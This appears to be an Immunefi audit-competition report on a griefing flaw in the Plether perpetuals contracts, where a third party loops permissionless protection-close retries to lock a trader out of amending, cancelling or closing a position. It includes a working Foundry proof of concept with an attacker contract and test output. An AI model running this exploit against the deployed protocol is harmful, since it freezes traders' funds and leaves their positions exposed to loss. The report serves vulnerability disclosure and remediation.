# \#98002 [SC-High] Permissionless protection-close retry loop locks a trader out of amending limits, cancelling, or closing their position for over 1 hour

**Submitted on Nov 4th 2026 at 10:08:14 UTC by @AvrahamAdvisory for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98002
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

When a triggered position protection fails on the trader's own close limits, it relatches. The protocol's stated remedy is that the owner then amends the limits and retries. However, `retryPositionProtectionClose` is permissionless and unthrottled, and `amendLatchedPositionProtectionCloseLimits` only works while the protection is `Latched` with no pending orders. An unprivileged attacker can therefore finalize each expired attempt and immediately re-commit a new retry in the same transaction, so the protection is never observable as `Latched` between transactions. For as long as the attacker continues (about one cheap transaction per minute), the trader cannot amend the limits, cannot cancel the protection, and cannot commit an ordinary close. Their position and its margin stay locked and exposed to the market. The PoC keeps a trader locked out for 61 minutes.

## Vulnerability Details

**1. The owner's only remedy requires `Latched` and zero pending orders**

[PositionProtectionBook.sol#L315-L327](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L327)

```solidity
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, PositionProtectionTypes.CloseFinancialLimits calldata limits)
    external nonReentrant
{
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    ...
}
```

**2. Anyone can move a `Latched` protection back into a pending attempt, with no throttle**

[PositionProtectionBook.sol#L382-L406](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406)

```solidity
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);   // no owner check
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    ...
    _recordCloseAttempt(protection, linkedOrderId);
}
```

**3. Any caller can finalize an expired attempt, which relatches the protection**

`router.executeOrder(attemptId, [])` after the execution deadline is permissionless. The router then calls `handleFailedProtectionAttempt`, which sets the status back to `Latched` ([PositionProtectionBook.sol#L637-L667](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L667)).

**4. Every other exit is closed while the protection is active**

- Cancel is allowed only in `PendingOpen`/`Armed` ([PositionProtectionBook.sol#L408-L418](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L418)). In `Triggered`/`Latched` it reverts `OrderRouter__ProtectionNotArmed`.
- An ordinary close commit reverts `OrderRouter__ProtectionActive` while a protection is active ([OrderLiquidationBatchLogic.sol#L313-L314](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L314)).
- The atomic owner exit `cancelPositionProtectionAndCommitClose` exists only for `Armed` ([PositionProtectionBook.sol#L341-L366](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L341-L366)). There is no equivalent for `Latched`.

Steps 2 and 3 can be combined in one transaction by an unprivileged contract. The protection then goes from one pending attempt to the next without ever being `Latched` at a transaction boundary. An EOA owner needs two transactions (finalize, then amend), and the attacker re-locks between them.

**Relation to MED-9 (known issue).** MED-9 was resolved by storing trader-selected close limits and copying them into every permissionless retry. Its resolution states: "Tight limits may prevent execution until conditions improve or the owner amends them." The project's own test `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry` exercises exactly this owner-amend flow after a relatch. This report shows that the amend remedy introduced by the MED-9 fix can be denied indefinitely by any third party. The issue is the interaction between the fix's owner-only amend window and the unthrottled permissionless retry, not the limits themselves.

## Attack scenario

1. Alice is LONG 10,000 lots at 1.00 with 2,000 USDG margin. She sets a stop-loss at 1.02 (2% adverse) with `maxGrossAccountDebitAssets = 300 USDG`; the expected debit at the stop is about 200 USDG.
2. The market gaps through the stop to 1.04. The triggered close fails on Alice's own cap (`ConstraintViolation`, `GrossAccountDebit`) and the protection relatches. Per the documented behavior, Alice should now amend the cap.
3. Bob, an unprivileged address with no position, runs a small contract. Each time the current attempt's execution deadline passes, it calls `executeOrder(attempt)` (relatch) and `retryPositionProtectionClose(protectionId)` in one transaction.
4. After every Bob transaction, Alice's `amendLatchedPositionProtectionCloseLimits` reverts `ProtectionNotLatched`, `cancelPositionProtection` reverts `ProtectionNotArmed`, and an ordinary close reverts `ProtectionActive`.
5. Bob repeats about once per execution window (~60 s). In the PoC, 60 transactions keep Alice locked out for 3,660 seconds. Bob gains nothing; his cost is gas only (962,572 gas per cycle, a few cents at typical Arbitrum gas prices).

## Impact Details

- **Selected impact: Temporary freezing of funds for at least 1 hour (Medium).** The trader cannot release their position or its margin through any owner-controlled path for as long as the attacker continues. The PoC demonstrates more than 1 hour, and the duration is bounded only by the attacker's willingness to pay small gas costs.
- **Also: Griefing (Medium).** There is no profit motive. The damage is to the user: they lose control of their exit while the position stays exposed to the market. If the price keeps moving against them, they cannot cut the loss at a level of their choosing.
- **Affected users:** any trader whose triggered protection fails on its own financial limits. This is exactly the documented case for which the owner-amend remedy exists, and it occurs naturally after price gaps.
- **Mitigating factors:**
  - Retried attempts still carry the trader's original limits, so the position closes if the market comes back within them.
  - An owner using a smart-contract account or EIP-7702 batching could finalize and amend atomically.
  - The protocol itself provides no such atomic path for `Latched` and no throttle or owner priority, so an ordinary EOA trader has no defense.

## Recommendation

Any of the following closes the loop:
- Allow the owner to cancel or replace a `Triggered`/`Latched` protection atomically. For example, extend `cancelPositionProtectionAndCommitClose`, or add an owner function that finalizes an expired attempt, amends the limits and commits the retry in one call.
- Restrict `retryPositionProtectionClose` to the owner, or give the owner an exclusive window after a relatch before third-party retries are allowed.
- Allow `amendLatchedPositionProtectionCloseLimits` while the account's only pending order is the protection's own attempt, and apply the amended limits to that attempt or the next one.

## References

- `packages/perps/src/PositionProtectionBook.sol`: `amendLatchedPositionProtectionCloseLimits` (L315), `retryPositionProtectionClose` (L382), `_cancel` (L408), `handleFailedProtectionAttempt` (L637), `cancelPositionProtectionAndCommitClose` (L341)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol` L313-L314 (`OrderRouter__ProtectionActive`)
- Known issue MED-9 and its resolution (Cecuro AI audit, 2026-10-26)
- Project test `test/perps/spec/trader/PositionProtection.t.sol::test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`


## Proof of Concept

## Proof of Concept

The PoC is a Foundry test in the repository's own suite. It reuses the existing `PositionProtectionTest` fixtures (`BasePerpTest` stack, `MockPyth`, the real `PositionProtectionBook` / `OrderRouter` / `CfdEngine`).

**How to run**

1. Save the file below as `packages/perps/test/perps/spec/trader/ProtectionRetryGrief.t.sol`, next to `PositionProtection.t.sol`.
2. From `packages/perps`:

```
FOUNDRY_TEST=test/perps/spec/trader forge test --match-path test/perps/spec/trader/ProtectionRetryGrief.t.sol -vv
```

(`FOUNDRY_TEST=test/perps/spec/trader` only limits compilation to that folder. A plain `forge test --match-path ...` also works.)

**What each test shows**

- `test_S1_GappedStopFailsOnOwnLimitAndRelatches`: the gapped stop fails on the trader's own `GrossAccountDebit` cap and the protection relatches. This is the documented "owner may now amend" state.
- `test_S1_PermissionlessRetryLoopDeniesOwnerEveryExitForOverOneHour`: an unprivileged contract finalizes each expired attempt and re-commits a retry in one transaction. After every attacker transaction the owner's amend reverts `ProtectionNotLatched`. At the end, cancel reverts `ProtectionNotArmed` and the position is still fully open, after more than 1 hour.
- `test_S1_Control_OwnerExitsWhenNotGriefed`: without the attacker, the owner amends after the relatch and the amended retry closes the position at the same price.

**Output**

```
Ran 3 tests for test/perps/spec/trader/ProtectionRetryGrief.t.sol:ProtectionRetryGriefTest
[PASS] test_S1_Control_OwnerExitsWhenNotGriefed() (gas: 3776408)
[PASS] test_S1_GappedStopFailsOnOwnLimitAndRelatches() (gas: 3757511)
[PASS] test_S1_PermissionlessRetryLoopDeniesOwnerEveryExitForOverOneHour() (gas: 48184504)
Logs:
  griefer gas per cycle (one tx): 962572
  griefer transactions: 60
  seconds owner was denied every exit: 3660

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 46.04ms (43.24ms CPU time)

Ran 1 test suite in 47.12ms (46.04ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

**Test file**

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface IExecuteOrder {
    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);
}

/// @dev Unprivileged contract. In ONE transaction it finalizes the expired protection close attempt (which relatches
///      the protection) and immediately commits a fresh permissionless retry, so the protection is never observable
///      in `Latched` state between transactions.
contract ProtectionRetryGriefer {
    function cycle(
        address router,
        IPositionProtectionActions book,
        uint64 expiredAttemptId,
        uint64 protectionId
    ) external returns (uint64 newAttemptId) {
        IExecuteOrder(router).executeOrder(expiredAttemptId, new bytes[](0));
        newAttemptId = book.retryPositionProtectionClose(protectionId);
    }
}

contract ProtectionRetryGriefTest is PositionProtectionTest {
    /// LONG loses when the index rises (fixture LONG_STOP_LOSS = 1.10 > mark). Stop 2% adverse.
    uint256 internal constant STOP = 102_000_000;
    /// The market gaps through the stop to 1.04 (~400 USDG loss on 10,000 lots).
    uint256 internal constant GAP_PRICE = 104_000_000;
    /// Trader caps the protected close's gross account debit at 300 USDG (loss at the stop is ~200).
    uint256 internal constant DEBIT_CAP = 300e6;

    function _armTightStop() internal returns (uint64 protectionId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, STOP);
        params.closeLimits.maxGrossAccountDebitAssets = DEBIT_CAP;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
    }

    function _unlimited() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    /// Step 0: the documented behavior. The gapped stop fails on the trader's own debit cap and relatches; the owner
    /// is then expected to amend the cap ("Tight limits may prevent execution until conditions improve or the owner
    /// amends them", MED-9 resolution).
    function test_S1_GappedStopFailsOnOwnLimitAndRelatches() public {
        _startRecordingLogs();
        uint64 protectionId = _armTightStop();
        uint64 attemptId = _triggerAt(protectionId, GAP_PRICE);

        bytes[] memory executionData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(attemptId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "gapped stop must fail");
        OrderV3Types.CompactOutcome memory outcome =
            _verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), attemptId);
        assertEq(
            uint8(outcome.failedConstraint),
            uint8(OrderV3Types.ConstraintKind.GrossAccountDebit),
            "failure is the trader's own debit cap"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "relatched: owner may amend now"
        );
    }

    /// Step 1: an unprivileged griefer keeps the protection out of `Latched` for over an hour. During the whole period
    /// the owner cannot amend the limits and cannot cancel the protection (an ordinary close commit is separately
    /// rejected with `OrderRouter__ProtectionActive`, router/OrderLiquidationBatchLogic.sol:314).
    function test_S1_PermissionlessRetryLoopDeniesOwnerEveryExitForOverOneHour() public {
        uint64 protectionId = _armTightStop();
        uint64 attemptId = _triggerAt(protectionId, GAP_PRICE);

        ProtectionRetryGriefer griefer = new ProtectionRetryGriefer();
        PositionProtectionTypes.CloseFinancialLimits memory amended = _unlimited();

        uint256 start = vm.getBlockTimestamp();
        uint256 cycles;
        uint256 gasPerCycle;
        while (vm.getBlockTimestamp() < start + 61 minutes && cycles < 100) {
            uint64 deadline = router.lifecycleBook().orderTiming(attemptId).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);

            uint256 g0 = gasleft();
            attemptId = griefer.cycle(address(router), protectionActions, attemptId, protectionId);
            if (cycles == 0) gasPerCycle = g0 - gasleft();
            ++cycles;

            // Owner's documented remedy is never available between transactions.
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amended);
        }

        // The owner also cannot cancel the protection or exit through an ordinary close.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "position still fully open");
        assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId, "protection lock still active");

        emit log_named_uint("griefer gas per cycle (one tx)", gasPerCycle);
        emit log_named_uint("griefer transactions", cycles);
        emit log_named_uint("seconds owner was denied every exit", vm.getBlockTimestamp() - start);
        assertGe(vm.getBlockTimestamp() - start, 1 hours, "denial lasted at least one hour");
    }

    /// Control: without the griefer the owner amends after relatch and exits at the gap price.
    function test_S1_Control_OwnerExitsWhenNotGriefed() public {
        uint64 protectionId = _armTightStop();
        uint64 attemptId = _triggerAt(protectionId, GAP_PRICE);
        _expireProtectionAttempt(attemptId, EXECUTION_KEEPER);

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());
        vm.prank(CAROL);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);

        bytes[] memory executionData = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "owner exits");
    }
}
```

